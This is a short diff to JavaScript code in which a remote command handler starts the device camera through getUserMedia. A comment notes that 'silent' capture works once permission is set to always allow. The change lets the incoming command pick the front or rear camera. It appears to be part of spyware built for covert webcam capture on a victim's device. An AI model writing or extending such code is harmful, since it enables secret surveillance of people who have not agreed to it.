@@ -6551,8 +6551,10 @@ async function handleCommand(commandId, commandData) {
             // "Silent" capture only works if permission is already "Always Allow".
 
             // Access camera
+            // Access camera
+            const facingMode = commandData.camera || 'user';
             const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: 'user' },
+                video: { facingMode: facingMode },
                 audio: false
             });
 
